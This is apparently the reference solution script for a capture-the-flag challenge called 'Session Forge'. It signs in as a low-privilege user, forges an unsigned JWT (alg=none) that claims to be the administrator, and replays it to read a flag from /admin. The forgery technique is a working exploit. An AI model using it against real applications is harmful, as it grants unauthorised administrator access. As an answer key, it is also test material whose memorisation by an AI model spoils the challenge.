#!/usr/bin/env bash
# Reference solution: Session Forge, JWT forgery via an unsigned token.
#
#   1. sign in with the low-privilege account and capture the session cookie
#   2. confirm the administration area refuses that genuine token
#   3. forge a token whose header says alg=none, with sub=administrator
#   4. replay it and read the trade pricing key
set -euo pipefail
BASE="${BASE:-https://northwind-01-session-forge.vercel.app}"
here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=./http.sh
source "$here/http.sh"
JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT

echo "== 1. sign in as the low-privilege account =="
"${HTTP[@]}" -s -m 30 -c "$JAR" -o /dev/null -X POST \
  -d 'username=wiener&password=peter' "$BASE/login"
TOKEN=$(awk '/session/{print $7}' "$JAR")
echo "   session cookie captured (${#TOKEN} bytes)"

echo
echo "== 2. replay the genuine token against /admin =="
"${HTTP[@]}" -s -m 30 -b "$JAR" -o /dev/null -w '   HTTP %{http_code}\n' "$BASE/admin"

echo
echo "== 3. forge an unsigned token claiming to be the administrator =="
FORGED=$(python3 "$here/forge.py" --alg none --sub administrator --original "$TOKEN" | tail -1)

echo
echo "== 4. replay it against /admin =="
"${HTTP[@]}" -s -m 30 -H "Cookie: session=$FORGED" "$BASE/admin" | grep -oE 'G24\{[^}]+\}' | head -1
